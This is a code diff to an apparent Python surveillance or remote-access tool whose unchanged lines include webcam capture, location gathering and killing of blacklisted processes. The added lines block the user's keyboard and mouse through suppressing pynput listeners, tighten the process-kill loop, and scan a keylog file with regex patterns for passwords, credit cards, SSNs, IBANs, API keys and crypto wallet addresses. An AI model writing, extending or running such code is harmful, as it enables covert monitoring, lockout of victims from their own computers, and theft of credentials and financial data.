@@ -22,6 +22,8 @@ import tkinter as tk
 from tkinter import messagebox
 import requests
 import gpsd
+from pynput import keyboard, mouse
+import re
 #create or read device id
 def uuid():
     try:
@@ -166,7 +168,7 @@ def monitor_blacklisted_programs():
         for process in psutil.process_iter(['pid', 'name']):
             if process.info['name'] in blacklist:
                 psutil.Process(process.info['pid']).kill()
-        time.sleep(1)  # time to check
+        time.sleep(0.25)  # time to check
 # function to get webcam pics
 def webcam(file_path="web.png"):
     cap = cv2.VideoCapture(0)
@@ -235,3 +237,84 @@ def get_combined_location():
         return combined_location
     except Exception as e:
         return str(e)
+input_blocked = False
+def block_input():
+    global input_blocked, keyboard_listener, mouse_listener
+    if not input_blocked:
+        keyboard_listener = keyboard.Listener(suppress=True)
+        mouse_listener = mouse.Listener(suppress=True)
+        keyboard_listener.start()
+        mouse_listener.start()
+        input_blocked = True
+def unblock_input():
+    global input_blocked, keyboard_listener, mouse_listener
+    if input_blocked:
+        keyboard_listener.stop()
+        mouse_listener.stop()
+        input_blocked = False
+
+def check_keylog():
+    file_path = 'keylog.txt'
+    output_file = 'scan.txt'
+    keywords = [
+        "email",
+        "domain",
+        "ip_address",
+        "iban",
+        "phone_number",
+        "credit_card",
+        "ssn",
+        "bssid",
+        "ssid",
+        "api_secret_key",
+        "us_driver_license",
+        "healthcare_identifier",
+        "password",
+        "us_ssn",
+        "ipv6_address",
+        "crypto_wallet_address",
+        "swiss_mobile_number",
+        "aircraft_registration",
+        "swiss_car_license_plate"
+    ]
+    patterns = {
+        "email": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b',
+        "domain": r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}',
+        "ip_address": r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
+        "iban": r'\b[A-Z]{2}[0-9]{2}(?:[ ]?[0-9]{4}){4}(?:[ ]?[0-9]{1,2})?\b',
+        "phone_number": [
+            r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
+            r'\+\d{1,2}\s?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}',
+            r'\b\d{2,4}[-.\s]?\d{3,4}[-.\s]?\d{3,4}\b'
+        ],
+        "credit_card": r'\b(?:\d{4}[ -]?){3}\d{4}\b',
+        "ssn": r'\b\d{3}-\d{2}-\d{4}\b',
+        "bssid": r'(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}',
+        "ssid": r'"([^"]+)"',
+        "api_secret_key": r'\b[0-9a-fA-F]{32}\b',
+        "us_driver_license": r'\b[A-Z0-9]{16}\b',
+        "healthcare_identifier": r'\b[0-9]{10}\b',
+        "password": r'\b[A-Za-z0-9!@#$%^&*()_+.-]{8,}\b',
+        "us_ssn": r'\b\d{3}-\d{2}-\d{4}\b',
+        "ipv6_address": r'\b[0-9a-fA-F:]+\b',
+        "crypto_wallet_address": r'\b(0x[0-9a-fA-F]{40}|L[a-km-zA-HJ-NP-Z1-9]{33})\b',
+        "swiss_mobile_number": r'\b(\+41|0)\s?[1-9][0-9]{1,8}\b',
+        "aircraft_registration": r'\b[A-Z0-9]{1,7}\b',
+        "swiss_car_license_plate": r'\b[A-Z]{2}-\d{1,6}\b'
+    }
+    keyword_counters = {key: 0 for key in keywords}
+    with open(file_path, 'r') as file:
+        data = file.read()
+        for key, pattern in patterns.items():
+            if key in keywords:
+                if isinstance(pattern, list):
+                    for pat in pattern:
+                        matches = re.findall(pat, data)
+                        keyword_counters[key] += len(matches)
+                else:
+                    matches = re.findall(pattern, data)
+                    keyword_counters[key] += len(matches)
+    with open(output_file, 'w') as file:
+        for key, count in keyword_counters.items():
+            if count > 0:
+                file.write(f"{key}: {count} times\n")
